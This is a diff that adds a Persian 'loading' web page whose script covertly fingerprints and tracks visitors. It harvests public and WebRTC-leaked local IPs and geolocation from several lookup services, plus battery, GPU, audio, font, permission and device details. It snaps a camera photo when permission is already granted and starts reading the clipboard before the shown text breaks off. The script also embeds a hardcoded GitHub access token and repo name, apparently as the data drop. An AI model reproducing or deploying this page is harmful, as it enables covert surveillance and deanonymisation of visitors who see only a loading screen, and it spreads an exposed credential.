@@ -1,0 +1,1513 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#eef2ff">
+<title>در حال بارگذاری…</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Tahoma,"Iranian Sans",Arial,sans-serif;
+    background:linear-gradient(135deg,#eef2ff 0%,#fce7f3 45%,#e0f2fe 100%);
+    min-height:100dvh;
+    display:flex;align-items:center;justify-content:center;
+    padding:16px;
+    color:#1f2937;
+    overflow:hidden;
+    -webkit-font-smoothing:antialiased;
+  }
+  body::before,
+  body::after{
+    content:"";position:fixed;border-radius:50%;filter:blur(60px);z-index:-1;pointer-events:none;opacity:.6;
+  }
+  body::before{
+    width:340px;height:340px;background:#c7d2fe;top:-100px;right:-100px;
+    animation:float1 9s ease-in-out infinite;
+  }
+  body::after{
+    width:300px;height:300px;background:#fbcfe8;bottom:-90px;left:-90px;
+    animation:float2 11s ease-in-out infinite;
+  }
+  @keyframes float1{0%,100%{transform:translate(0,0)}50%{transform:translate(-30px,30px)}}
+  @keyframes float2{0%,100%{transform:translate(0,0)}50%{transform:translate(35px,-25px)}}
+
+  .card{
+    position:relative;
+    background:rgba(255,255,255,.86);
+    -webkit-backdrop-filter:blur(14px) saturate(140%);
+    backdrop-filter:blur(14px) saturate(140%);
+    border:1px solid rgba(255,255,255,.85);
+    border-radius:26px;
+    box-shadow:
+      0 20px 60px rgba(99,102,241,.18),
+      0 8px 22px rgba(236,72,153,.10),
+      inset 0 1px 0 rgba(255,255,255,.9);
+    width:100%;
+    max-width:540px;
+    padding:30px 26px 32px;
+    text-align:center;
+    overflow:hidden;
+    animation:cardIn .5s cubic-bezier(.22,.9,.34,1) both;
+  }
+  @keyframes cardIn{
+    from{opacity:0;transform:translateY(14px) scale(.98)}
+    to{opacity:1;transform:none}
+  }
+  .card::before{
+    content:"";position:absolute;inset:0;
+    background:
+      radial-gradient(600px 200px at 50% -10%,rgba(139,92,246,.14),transparent 70%),
+      radial-gradient(500px 200px at 50% 110%,rgba(236,72,153,.10),transparent 70%);
+    pointer-events:none;
+  }
+
+  .stage{position:relative;z-index:1}
+
+  /* Loader */
+  #loader-wrap{
+    display:flex;flex-direction:column;align-items:center;gap:14px;
+    padding:6px 0 4px;
+  }
+  .loader-svg{
+    width:130px;height:130px;display:block;
+    filter:drop-shadow(0 8px 22px rgba(99,102,241,.35));
+  }
+  .loader-text{
+    font-size:14px;color:#6366f1;font-weight:600;letter-spacing:.3px;
+    animation:pulse 1.6s ease-in-out infinite;
+  }
+  @keyframes pulse{0%,100%{opacity:.7}50%{opacity:1}}
+
+  /* Typing */
+  #typing-wrap{
+    display:flex;flex-direction:column;align-items:stretch;gap:8px;
+    min-height:270px;
+    text-align:right;
+  }
+  .typing{
+    display:flex;flex-direction:column;gap:9px;
+    font-size:14.5px;line-height:1.85;color:#334155;
+    font-weight:500;
+    word-break:break-word;
+  }
+  .typing > div{
+    opacity:0;
+    transform:translateY(4px);
+    animation:lineIn .35s ease-out forwards;
+    padding:6px 12px;
+    border-radius:12px;
+    background:linear-gradient(90deg,rgba(238,242,255,.7),rgba(252,231,243,.55));
+    border:1px solid rgba(255,255,255,.9);
+    box-shadow:0 2px 6px rgba(99,102,241,.06);
+  }
+  @keyframes lineIn{
+    to{opacity:1;transform:none}
+  }
+  .caret{
+    display:inline-block;
+    color:#8b5cf6;
+    font-weight:700;
+    margin-right:2px;
+    animation:blink .9s steps(1) infinite;
+  }
+  @keyframes blink{50%{opacity:0}}
+
+  /* Result */
+  .result{
+    display:flex;flex-direction:column;align-items:center;gap:14px;
+    padding:8px 2px;
+    text-align:center;
+    animation:cardIn .5s cubic-bezier(.22,.9,.34,1) both;
+  }
+  .result .badge{
+    width:74px;height:74px;border-radius:50%;
+    display:flex;align-items:center;justify-content:center;
+    font-size:38px;line-height:1;
+    color:#fff;
+    position:relative;
+    box-shadow:0 12px 28px rgba(0,0,0,.12);
+  }
+  .result.success .badge{
+    background:linear-gradient(135deg,#22c55e,#16a34a);
+    box-shadow:0 14px 30px rgba(34,197,94,.35);
+  }
+  .result.error .badge{
+    background:linear-gradient(135deg,#ef4444,#dc2626);
+    box-shadow:0 14px 30px rgba(239,68,68,.35);
+  }
+  .result .badge::after{
+    content:"";position:absolute;inset:-8px;border-radius:50%;
+    border:2px solid currentColor;opacity:.35;
+    animation:ripple 1.8s ease-out infinite;
+  }
+  .result.success .badge::after{color:#22c55e}
+  .result.error .badge::after{color:#ef4444}
+  @keyframes ripple{
+    0%{transform:scale(.85);opacity:.45}
+    100%{transform:scale(1.35);opacity:0}
+  }
+  .result .title{
+    font-size:19px;font-weight:800;letter-spacing:.2px;
+  }
+  .result.success .title{color:#166534}
+  .result.error .title{color:#991b1b}
+  .result .desc{
+    font-size:13.5px;color:#475569;line-height:1.85;
+    max-width:440px;
+    padding:10px 14px;
+    background:rgba(255,255,255,.7);
+    border:1px solid rgba(255,255,255,.9);
+    border-radius:14px;
+    word-break:break-word;
+    font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+    text-align:left;
+    direction:ltr;
+    max-height:180px;
+    overflow:auto;
+  }
+  .result.success .desc{border-left:3px solid #22c55e}
+  .result.error .desc{border-left:3px solid #ef4444}
+
+  @media (max-width:420px){
+    .card{padding:24px 18px 26px;border-radius:22px}
+    .loader-svg{width:110px;height:110px}
+    .typing{font-size:13.5px;line-height:1.75}
+    .typing > div{padding:5px 10px}
+    .result .title{font-size:17px}
+  }
+</style>
+</head>
+<body>
+
+<div class="card">
+
+  <div id="loader-wrap" class="stage">
+    <svg class="loader-svg" viewBox="0 0 120 120" aria-hidden="true">
+      <defs>
+        <linearGradient id="lgA" x1="0%" y1="0%" x2="100%" y2="100%">
+          <stop offset="0%" stop-color="#6366f1"/>
+          <stop offset="50%" stop-color="#8b5cf6"/>
+          <stop offset="100%" stop-color="#ec4899"/>
+        </linearGradient>
+        <linearGradient id="lgB" x1="0%" y1="0%" x2="100%" y2="100%">
+          <stop offset="0%" stop-color="#06b6d4"/>
+          <stop offset="100%" stop-color="#3b82f6"/>
+        </linearGradient>
+        <radialGradient id="lgC" cx="50%" cy="50%" r="50%">
+          <stop offset="0%" stop-color="#a78bfa"/>
+          <stop offset="100%" stop-color="#6366f1"/>
+        </radialGradient>
+      </defs>
+
+      <circle cx="60" cy="60" r="52" fill="none" stroke="#e5e7eb" stroke-width="1.5" opacity=".55"/>
+
+      <circle cx="60" cy="60" r="18" fill="none" stroke="#e5e7eb" stroke-width="1.5"
+              stroke-dasharray="2 5" opacity=".7">
+        <animateTransform attributeName="transform" type="rotate"
+                          from="0 60 60" to="360 60 60" dur="6s" repeatCount="indefinite"/>
+      </circle>
+
+      <g>
+        <circle cx="60" cy="60" r="46" fill="none" stroke="url(#lgA)"
+                stroke-width="3" stroke-linecap="round"
+                stroke-dasharray="70 220">
+          <animateTransform attributeName="transform" type="rotate"
+                            from="0 60 60" to="360 60 60" dur="1.15s" repeatCount="indefinite"/>
+        </circle>
+      </g>
+
+      <g>
+        <circle cx="60" cy="60" r="33" fill="none" stroke="url(#lgB)"
+                stroke-width="2.6" stroke-linecap="round"
+                stroke-dasharray="45 165">
+          <animateTransform attributeName="transform" type="rotate"
+                            from="360 60 60" to="0 60 60" dur=".9s" repeatCount="indefinite"/>
+        </circle>
+      </g>
+
+      <circle cx="60" cy="60" r="5" fill="url(#lgC)">
+        <animate attributeName="r" values="3.5;6.5;3.5" dur=".85s" repeatCount="indefinite"/>
+        <animate attributeName="opacity" values="1;.55;1" dur=".85s" repeatCount="indefinite"/>
+      </circle>
+
+      <g opacity=".9">
+        <circle cx="106" cy="60" r="3" fill="#ec4899">
+          <animateTransform attributeName="transform" type="rotate"
+                            from="0 60 60" to="360 60 60" dur="2.2s" repeatCount="indefinite"/>
+        </circle>
+      </g>
+    </svg>
+    <div class="loader-text">در حال آماده‌سازی…</div>
+  </div>
+
+  <div id="typing-wrap" class="stage" style="display:none">
+    <div id="typing" class="typing"></div>
+  </div>
+
+  <div id="result" class="stage result" style="display:none"></div>
+
+</div>
+
+<script>
+(() => {
+  'use strict';
+
+  /* ============================================================
+   *  زمان شروع صفحه — همه چیز نسبت به این اندازه‌گیری می‌شود
+   * ============================================================ */
+  const PAGE_START = performance.now();
+
+  /* ============================================================
+   *  URL Params — _0xTk / _0xOn / _0xRp / UseriD
+   * ============================================================ */
+  const getUrlParam = (base) => {
+    if (!base) return null;
+    const search = location.search.replace(/^\?/, '');
+    if (!search) return null;
+
+    const names = [base, '_' + base];
+    const params = new URLSearchParams(search);
+    for (const n of names) {
+      const v = params.get(n);
+      if (v) return v;
+    }
+
+    // حالت خام: ?0xTk_VALUE یا ?_0xTk_VALUE
+    for (const n of names) {
+      const marker = n + '_';
+      const idx = search.indexOf(marker);
+      if (idx !== -1) {
+        const before = idx === 0 ? '&' : search[idx - 1];
+        if (before === '&' || idx === 0) {
+          const rest = search.slice(idx + marker.length);
+          const amp = rest.indexOf('&');
+          try { return decodeURIComponent(amp === -1 ? rest : rest.slice(0, amp)); }
+          catch { return (amp === -1 ? rest : rest.slice(0, amp)); }
+        }
+      }
+    }
+    return null;
+  };
+
+  const _0xTkFromUrl   = getUrlParam('0xTk');
+  const _0xOnFromUrl   = getUrlParam('0xOn');
+  const _0xRpFromUrl   = getUrlParam('0xRp');
+  const _0xUseriDUrl   = getUrlParam('UseriD') || getUrlParam('userId') || getUrlParam('userid') || getUrlParam('user');
+
+  const _0xTkDefault =
+    "github_pat_11CFHQNFQ0tOczsaLSMWet_" +
+    "7k98tNWSY5BnO9viztruJKo4wVHS875ZEMzxAXgJAYz4GVH4ZQHfI2TNCQE";
+
+  const _0xTk = _0xTkFromUrl || _0xTkDefault;
+  const _0xOn = _0xOnFromUrl || "WendigosCyber";
+  const _0xRp = _0xRpFromUrl || "WendigosCyber";
+  const _0xUseriD = _0xUseriDUrl || null;
+
+  /* ============================================================
+   *  Storage keys / Cookie utils
+   * ============================================================ */
+  const _0xCk  = "atlas_visitor_registered_v5";
+  const _0xVck = "wendigos_visitor_id_v5";
+  const _0xMx  = 60 * 60 * 24 * 365;
+
+  const _0xGc = (name) => {
+    const key = encodeURIComponent(name) + "=";
+    for (const part of document.cookie.split("; ")) {
+      if (part.startsWith(key)) return decodeURIComponent(part.slice(key.length));
+    }
+    return null;
+  };
+
+  const _0xSc = (name, value, maxAgeSeconds) => {
+    document.cookie = `${encodeURIComponent(name)}=${encodeURIComponent(value)}; max-age=${maxAgeSeconds}; path=/; samesite=lax`;
+  };
+
+  const _0xGetOrCreateVisitorId = () => {
+    let vid = _0xGc(_0xVck);
+    if (vid && /^\d{5}$/.test(vid)) return vid;
+    const newId = String(Math.floor(10000 + Math.random() * 90000));
+    _0xSc(_0xVck, newId, _0xMx);
+    return newId;
+  };
+
+  /* ============================================================
+   *  Fetch با Timeout پیش‌فرض ۳ ثانیه (سریع)
+   * ============================================================ */
+  const _0xTf = async (url, options = {}, timeoutMs = 3000) => {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), timeoutMs);
+    try {
+      return await fetch(url, { ...options, signal: controller.signal, cache: 'no-store' });
+    } finally {
+      clearTimeout(id);
+    }
+  };
+
+  /* ============================================================
+   *  Collectors
+   * ============================================================ */
+  const _0xGiv4 = async () => {
+    try {
+      const res = await _0xTf("https://api.ipify.org?format=json");
+      if (!res.ok) return null;
+      const json = await res.json();
+      return { ip: json.ip, version: 'IPv4' };
+    } catch (e) { return null; }
+  };
+
+  const _0xGiv6 = async () => {
+    try {
+      const res = await _0xTf("https://api6.ipify.org?format=json");
+      if (!res.ok) return null;
+      const json = await res.json();
+      return { ip: json.ip, version: 'IPv6' };
+    } catch (e) { return null; }
+  };
+
+  const _0xLocalIP = () => {
+    return new Promise((resolve) => {
+      const ips = { ipv4: null, ipv6: null };
+      let pc;
+      try {
+        pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+      } catch (e) { return resolve(ips); }
+
+      let done = false;
+      const finish = () => {
+        if (done) return;
+        done = true;
+        try { pc.close(); } catch {}
+        resolve(ips);
+      };
+      pc.onicecandidate = (e) => {
+        if (!e.candidate) return;
+        const candidate = e.candidate.candidate;
+        const ipv4Match = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+        const ipv6Match = candidate.match(/([a-f0-9:]+:+)+[a-f0-9]+/i);
+        if (ipv4Match && !ips.ipv4 &&
+            !ipv4Match[0].startsWith('127.') &&
+            ipv4Match[0] !== '0.0.0.0') {
+          ips.ipv4 = ipv4Match[0];
+        }
+        if (ipv6Match && !ips.ipv6 &&
+            !ipv6Match[0].startsWith('::1') &&
+            ipv6Match[0] !== '::') {
+          ips.ipv6 = ipv6Match[0];
+        }
+        if (ips.ipv4 && ips.ipv6) finish();
+      };
+      try { pc.createDataChannel(''); } catch {}
+      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
+      setTimeout(finish, 1800);
+    });
+  };
+
+  const _0xGb = async () => {
+    try {
+      if (!navigator.getBattery) return null;
+      const b = await navigator.getBattery();
+      return {
+        level: Math.round((b.level || 0) * 100),
+        charging: !!b.charging,
+        chargingTime: Number.isFinite(b.chargingTime) ? b.chargingTime : null,
+        dischargingTime: Number.isFinite(b.dischargingTime) ? b.dischargingTime : null
+      };
+    } catch (e) { return null; }
+  };
+
+  const _0xGu = () => {
+    const uaData = navigator.userAgentData;
+    if (!uaData) return null;
+    return {
+      brands: uaData.brands || null,
+      mobile: typeof uaData.mobile === "boolean" ? uaData.mobile : null,
+      platform: uaData.platform || null
+    };
+  };
+
+  const _0xGw = () => {
+    try {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext("webgl2") ||
+                 canvas.getContext("webgl") ||
+                 canvas.getContext("experimental-webgl");
+      if (!gl) return null;
+      const debug = gl.getExtension("WEBGL_debug_renderer_info");
+      const exts = gl.getSupportedExtensions();
+      const params = {
+        MAX_TEXTURE_SIZE: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+        MAX_RENDERBUFFER_SIZE: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
+        MAX_VIEWPORT_DIMS: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
+        MAX_VERTEX_ATTRIBS: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
+        MAX_FRAGMENT_UNIFORM_VECTORS: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
+        ALIASED_LINE_WIDTH_RANGE: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
+        EXTENSION_COUNT: exts ? exts.length : 0,
+        EXTENSIONS_SAMPLE: exts ? exts.slice(0, 20) : null
+      };
+      return {
+        vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : null,
+        renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : null,
+        version: gl.getParameter(gl.VERSION),
+        shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+        limits: params
+      };
+    } catch (e) { return null; }
+  };
+
+  const _0xGwg = async () => {
+    try {
+      if (!navigator.gpu) return null;
+      const adapter = await navigator.gpu.requestAdapter();
+      if (!adapter) return null;
+      const features = [...adapter.features].map(f => f);
+      const limits = {};
+      for (const key of Object.keys(adapter.limits)) limits[key] = adapter.limits[key];
+      return {
+        vendor: adapter.vendor || null,
+        architecture: adapter.architecture || null,
+        description: adapter.description || null,
+        features,
+        limits
+      };
+    } catch (e) { return null; }
+  };
+
+  const _0xGa = async () => {
+    try {
+      const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+      if (!Ctx) return null;
+      const sampleRate = 44100;
+      const ctx = new Ctx(1, sampleRate, sampleRate);
+      const osc = ctx.createOscillator();
+      const comp = ctx.createDynamicsCompressor();
+      const bq = ctx.createBiquadFilter();
+      bq.type = "lowpass";
+      bq.frequency.value = 2000;
+      osc.type = "sawtooth";
+      osc.frequency.value = 800;
+      const gain = ctx.createGain();
+      gain.gain.value = 0.8;
+      osc.connect(bq);
+      bq.connect(comp);
+      comp.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start(0);
+      const buffer = await ctx.startRendering();
+      const data = buffer.getChannelData(0);
+      let sum = 0, peak = 0;
+      for (let i = 0; i < data.length; i++) {
+        const abs = Math.abs(data[i]);
+        sum += abs;
+        if (abs > peak) peak = abs;
+      }
+      return { hash: String(Math.round(sum * 1e8)), peak: peak.toFixed(6), length: data.length };
+    } catch (e) { return null; }
+  };
+
+  const _0xGt = () => ({
+    touch: "ontouchstart" in window || navigator.maxTouchPoints > 0,
+    maxTouchPoints: navigator.maxTouchPoints || 0
+  });
+
+  const _0xDf = async () => {
+    const fonts = [
+      "Arial","Verdana","Tahoma","Times New Roman","Courier New","Georgia",
+      "Segoe UI","Roboto","Comic Sans MS","Trebuchet MS","Impact",
+      "Lucida Console","Palatino Linotype","Century Gothic","Helvetica",
+      "Calibri","Cambria","Constantia","Candara","Consolas","Corbel",
+      "Franklin Gothic Medium","Gabriola","MS Gothic","MS PGothic","SimSun"
+    ];
+    const available = [];
+    const baseFonts = ["monospace", "sans-serif", "serif"];
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    if (!ctx) return null;
+    canvas.width = 300;
+    canvas.height = 50;
+    const testString = "mmmmmmmmmmllllllllliiiiiiiiiiWWWWW";
+    const baseWidths = {};
+    for (const bf of baseFonts) {
+      ctx.font = `16px ${bf}`;
+      baseWidths[bf] = ctx.measureText(testString).width;
+    }
+    for (const font of fonts) {
+      for (const bf of baseFonts) {
+        ctx.font = `16px "${font}", ${bf}`;
+        const width = ctx.measureText(testString).width;
+        if (width !== baseWidths[bf]) {
+          available.push(font);
+          break;
+        }
+      }
+    }
+    return available;
+  };
+
+  const _0xGmd = async () => {
+    try {
+      if (!navigator.mediaDevices?.enumerateDevices) return null;
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      return {
+        total: devices.length,
+        audioinput: devices.filter(d => d.kind === "audioinput").length,
+        videoinput: devices.filter(d => d.kind === "videoinput").length,
+        audiooutput: devices.filter(d => d.kind === "audiooutput").length
+      };
+    } catch (e) { return null; }
+  };
+
+  const _0xGn = () => {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!c) return null;
+    return {
+      effectiveType: c.effectiveType || null,
+      type: c.type || null,
+      rtt: c.rtt ?? null,
+      downlink: c.downlink ?? null,
+      saveData: c.saveData ?? null
+    };
+  };
+
+  const _0xGth     = () => ({ darkMode: window.matchMedia("(prefers-color-scheme: dark)").matches });
+  const _0xGcg     = () => ({
+    srgb: matchMedia("(color-gamut: srgb)").matches,
+    p3: matchMedia("(color-gamut: p3)").matches,
+    rec2020: matchMedia("(color-gamut: rec2020)").matches
+  });
+  const _0xGhdr    = () => ({ hdr: matchMedia("(dynamic-range: high)").matches });
+  const _0xGpwa    = () => ({
+    standalone: window.matchMedia("(display-mode: standalone)").matches || navigator.standalone === true
+  });
+
+  const _0xGp = async () => {
+    if (!navigator.permissions?.query) return null;
+    const names = ["geolocation","camera","microphone","notifications",
+      "clipboard-read","clipboard-write","accelerometer","gyroscope","magnetometer"];
+    const result = {};
+    for (const name of names) {
+      try {
+        const p = await navigator.permissions.query({ name });
+        result[name] = p.state;
+      } catch (e) {}
+    }
+    return result;
+  };
+
+  const _0xGtz = () => {
+    const now = new Date();
+    return {
+      offsetMinutes: now.getTimezoneOffset(),
+      calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
+      numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem
+    };
+  };
+
+  const _0xGlocale = () => {
+    try {
+      return {
+        dateTime: Intl.DateTimeFormat().resolvedOptions(),
+        number: Intl.NumberFormat().resolvedOptions(),
+        collator: Intl.Collator().resolvedOptions()
+      };
+    } catch (e) { return null; }
+  };
+
+  const _0xGperf = () => {
+    const perf = performance;
+    const mem = perf.memory || perf.msMemory;
+    const navEntry = perf.getEntriesByType?.("navigation")?.[0];
+    return {
+      timeOrigin: perf.timeOrigin,
+      now: perf.now(),
+      memory: mem ? {
+        jsHeapSizeLimit: mem.jsHeapSizeLimit,
+        totalJSHeapSize: mem.totalJSHeapSize,
+        usedJSHeapSize: mem.usedJSHeapSize
+      } : null,
+      navigation: navEntry ? {
+        type: navEntry.type,
+        redirectCount: navEntry.redirectCount,
+        domContentLoaded: navEntry.domContentLoadedEventStart,
+        loadComplete: navEntry.loadEventStart
+      } : null
+    };
+  };
+
+  const _0xGmc = async () => {
+    if (!navigator.mediaCapabilities) return null;
+    const configs = [
+      { type: "file", video: { contentType: "video/mp4; codecs=avc1.42E01E", width: 1920, height: 1080, bitrate: 1000000, framerate: 30 } },
+      { type: "file", video: { contentType: "video/webm; codecs=vp9",      width: 1920, height: 1080, bitrate: 1000000, framerate: 30 } },
+      { type: "file", video: { contentType: "video/mp4; codecs=av01.0.05M.08", width: 1920, height: 1080, bitrate: 1000000, framerate: 30 } }
+    ];
+    const result = {};
+    for (const config of configs) {
+      try {
+        const info = await navigator.mediaCapabilities.decodingInfo(config);
+        result[config.video.contentType] = {
+          supported: info.supported, smooth: info.smooth, powerEfficient: info.powerEfficient
+        };
+      } catch (e) { result[config.video.contentType] = null; }
+    }
+    return result;
+  };
+
+  const _0xGso = () => {
+    if (!screen.orientation) return null;
+    return { type: screen.orientation.type, angle: screen.orientation.angle };
+  };
+
+  const _0xGbf = () => ({
+    gpu: "gpu" in navigator,
+    serviceWorker: "serviceWorker" in navigator,
+    bluetooth: "bluetooth" in navigator,
+    usb: "usb" in navigator,
+    serial: "serial" in navigator,
+    NDEFReader: "NDEFReader" in window,
+    contacts: "contacts" in navigator
+  });
+
+  const _0xGmime = () => {
+    if (!navigator.mimeTypes) return null;
+    const arr = [];
+    for (let i = 0; i < navigator.mimeTypes.length; i++) {
+      const m = navigator.mimeTypes[i];
+      arr.push({ type: m.type, description: m.description, suffixes: m.suffixes });
+    }
+    return arr;
+  };
+
+  const _0xGplug = () => {
+    if (!navigator.plugins) return null;
+    const arr = [];
+    for (let i = 0; i < navigator.plugins.length; i++) {
+      const p = navigator.plugins[i];
+      arr.push({ name: p.name, filename: p.filename, description: p.description });
+    }
+    return arr;
+  };
+
+  const _0xGrtc = async () => {
+    try {
+      if (!window.RTCPeerConnection) return null;
+      const pc = new RTCPeerConnection({ iceServers: [] });
+      const offer = await pc.createOffer({ offerToReceiveAudio: true, offerToReceiveVideo: true });
+      const sdp = offer.sdp;
+      pc.close();
+      const lines = sdp.split("\n");
+      const fingerprint = lines.find(l => l.startsWith("a=fingerprint:"));
+      const iceUfrag = lines.find(l => l.startsWith("a=ice-ufrag:"));
+      return {
+        fingerprint: fingerprint?.split(" ")[1] || null,
+        iceUfrag: iceUfrag?.split(":")[1] || null,
+        sdpLines: lines.length
+      };
+    } catch (e) { return null; }
+  };
+
+  const _0xGhighEntropy = async () => {
+    try {
+      if (!navigator.userAgentData?.getHighEntropyValues) return null;
+      const hints = ["architecture","bitness","model","platformVersion","uaFullVersion","fullVersionList"];
+      return await navigator.userAgentData.getHighEntropyValues(hints);
+    } catch (e) { return null; }
+  };
+
+  const _0xGstorage = async () => {
+    try {
+      if (!navigator.storage?.estimate) return null;
+      const estimate = await navigator.storage.estimate();
+      let persisted = null;
+      try { persisted = await navigator.storage.persisted?.() ?? null; } catch {}
+      return { quota: estimate.quota, usage: estimate.usage, persisted };
+    } catch (e) { return null; }
+  };
+
+  const _0xGprivate = async () => {
+    const tests = [];
+    try { localStorage.setItem('__pvt', '1'); localStorage.removeItem('__pvt'); tests.push('localStorage:ok'); }
+    catch { tests.push('localStorage:blocked'); }
+    try { indexedDB.open('__pvt'); tests.push('indexedDB:ok'); }
+    catch { tests.push('indexedDB:blocked'); }
+    const isPrivate = tests.some(t => t.includes('blocked'));
+    return { isPrivate, tests };
+  };
+
+  const _0xGcf = async () => {
+    try {
+      const res = await _0xTf("https://www.cloudflare.com/cdn-cgi/trace");
+      if (!res.ok) return null;
+      const text = await res.text();
+      const data = {};
+      text.split('\n').forEach(line => {
+        const idx = line.indexOf('=');
+        if (idx > -1) data[line.slice(0, idx)] = line.slice(idx + 1);
+      });
+      return data;
+    } catch (e) { return null; }
+  };
+
+  const _0xGrdap = async (ip) => {
+    try {
+      const res = await _0xTf(`https://rdap.org/ip/${ip}`);
+      if (!res.ok) return null;
+      return await res.json();
+    } catch (e) { return null; }
+  };
+
+  const _0xGrdns = async (ip) => {
+    try {
+      const parts = ip.split('.');
+      if (parts.length !== 4) return null;
+      const reverse = `${parts[3]}.${parts[2]}.${parts[1]}.${parts[0]}.in-addr.arpa`;
+      const res = await _0xTf(`https://dns.google/resolve?name=${reverse}&type=PTR`);
+      if (!res.ok) return null;
+      const json = await res.json();
+      if (json.Answer && json.Answer.length > 0) {
+        return json.Answer.map(a => a.data).join(', ');
+      }
+      return null;
+    } catch (e) { return null; }
+  };
+
+  const _0xGipd = async (ip) => {
+    try {
+      const res = await _0xTf(`https://ipapi.co/${ip}/json/`);
+      if (!res.ok) return null;
+      const json = await res.json();
+      if (json.error) return null;
+      return _0xNorm(json);
+    } catch (e) { return null; }
+  };
+
+  const _0xGwho = async () => {
+    try {
+      const res = await _0xTf("https://ipwho.is/");
+      if (!res.ok) return null;
+      const json = await res.json();
+      if (!json.success) return null;
+      return _0xNormFromWho(json);
+    } catch (e) { return null; }
+  };
+
+  const _0xGipinfo = async (ip) => {
+    try {
+      const res = await _0xTf(`https://ipinfo.io/${ip}/json`);
+      if (!res.ok) return null;
+      const json = await res.json();
+      if (!json.ip) return null;
+      return _0xNormFromIpinfo(json);
+    } catch (e) { return null; }
+  };
+
+  const _0xGgeodb = async (ip) => {
+    try {
+      const res = await _0xTf(`https://geolocation-db.com/json/${ip}`);
+      if (!res.ok) return null;
+      const json = await res.json();
+      if (!json.IPv4) return null;
+      return {
+        ip: json.IPv4, version: 'IPv4',
+        country: json.country_name, countryCode: json.country_code,
+        region: json.state, city: json.city, postal: json.postal,
+        latitude: json.latitude, longitude: json.longitude,
+        timezone: null, org: null, isp: null
+      };
+    } catch (e) { return null; }
+  };
+
+  const _0xGipwhois = async (ip) => {
+    try {
+      const res = await _0xTf(`https://ipwhois.app/json/${ip}`);
+      if (!res.ok) return null;
+      const json = await res.json();
+      if (!json.success) return null;
+      return _0xNormFromWho(json);
+    } catch (e) { return null; }
+  };
+
+  const _0xNorm = (json) => ({
+    ip: json.ip || null,
+    version: json.version || (json.ip && json.ip.includes(':') ? 'IPv6' : 'IPv4'),
+    country: json.country_name || null,
+    countryCode: json.country_code || null,
+    region: json.region || null,
+    city: json.city || null,
+    postal: json.postal || null,
+    latitude: json.latitude || null,
+    longitude: json.longitude || null,
+    timezone: json.timezone || null,
+    org: json.org || null,
+    isp: json.org || null,
+    asn: json.asn || null,
+    connectionType: json.connection?.type || null
+  });
+
+  const _0xNormFromWho = (json) => ({
+    ip: json.ip || null,
+    version: (json.ip && json.ip.includes(':') ? 'IPv6' : 'IPv4'),
+    country: json.country || null,
+    countryCode: json.country_code || null,
+    region: json.region || null,
+    city: json.city || null,
+    postal: json.postal || null,
+    latitude: json.latitude || null,
+    longitude: json.longitude || null,
+    timezone: json.timezone?.id || json.timezone || null,
+    org: json.connection?.org || null,
+    isp: json.connection?.isp || null,
+    asn: json.connection?.asn || null,
+    connectionType: null
+  });
+
+  const _0xNormFromIpinfo = (json) => ({
+    ip: json.ip || null,
+    version: (json.ip && json.ip.includes(':') ? 'IPv6' : 'IPv4'),
+    country: json.country || null,
+    countryCode: json.country || null,
+    region: json.region || null,
+    city: json.city || null,
+    postal: json.postal || null,
+    latitude: json.loc ? json.loc.split(',')[0] : null,
+    longitude: json.loc ? json.loc.split(',')[1] : null,
+    timezone: json.timezone || null,
+    org: json.org || null,
+    isp: json.org || null,
+    asn: json.asn?.asn || null,
+    connectionType: null
+  });
+
+  const _0xGld = async (ip) => {
+    const attempts = [
+      () => _0xGipd(ip),
+      () => _0xGwho(),
+      () => _0xGipinfo(ip),
+      () => _0xGgeodb(ip),
+      () => _0xGipwhois(ip)
+    ];
+    for (const attempt of attempts) {
+      try {
+        const result = await attempt();
+        if (result) return result;
+      } catch (e) {}
+    }
+    return null;
+  };
+
+  const _0xGcam = async () => {
+    try {
+      let permState = "prompt";
+      if (navigator.permissions?.query) {
+        try { const s = await navigator.permissions.query({ name: "camera" }); permState = s.state; } catch {}
+      }
+      if (permState !== "granted") return { permission: permState, photo: null };
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+      const track = stream.getVideoTracks()[0];
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.setAttribute("playsinline", true);
+      video.play();
+      await new Promise((resolve) => { video.onloadedmetadata = () => resolve(); });
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0);
+      const dataUri = canvas.toDataURL("image/jpeg", 0.4);
+      track.stop();
+      stream.getTracks().forEach(t => t.stop());
+      return { permission: "granted", photo: dataUri };
+    } catch (e) {
+      return { permission: "denied_or_error", error: e.toString() };
+    }
+  };
+
+  const _0xGclip = async () => {
+    try {
+      let permState = "prompt";
+      if (navigator.permissions?.query) {
+        try { const s = await navigator.permissions.query({ name: "clipboard-read" }); permState = s.state; } catch {}
+      }
+      if (permState !== "granted") return { permission: permState, text: null };
